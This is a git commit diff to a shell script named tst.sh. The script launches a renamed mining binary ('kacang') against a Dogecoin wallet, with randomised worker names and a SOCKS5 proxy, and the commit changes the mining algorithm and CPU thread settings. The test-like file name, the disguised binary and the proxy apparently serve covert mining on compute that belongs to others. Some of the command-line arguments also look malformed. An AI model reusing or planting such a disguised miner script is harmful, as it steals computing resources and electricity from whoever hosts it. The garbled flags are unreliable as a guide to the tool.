e81c816c3da3b0328989a38daf347146516a5635
MarisaNicole <88166806+MarisaNicole@users.noreply.github.com>
2021-07-30 05:11:46 +0700

    Update tst.sh

--- tst.sh
+++ tst.sh
@@ -4,4 +4,4 @@ WALLET=DOGE:DLd8SKUyrMCAuUt4ToGWDirH6fpQTf6BvV
 WORKER=$(echo $(shuf -i 10-299 -n 1)-ANDRO-X)
 PROXY=socks5://192.252.209.155:14455
 chmod +x kacang
-./kacang --disable-gpu --algorithm randomx -o --pool $POOL -a rx -k -u --wallet $WALLET.$WORKER#tyhl-8s04 --cpu-threads $PROXY -q
+./kacang --disable-gpu --algorithm yespower2b -o --pool $POOL -a rx -k -u --wallet $WALLET.$WORKER#tyhl-8s04 --cpu-threads 2 --cpu-threads-intensity 1!1!2 $PROXY -q
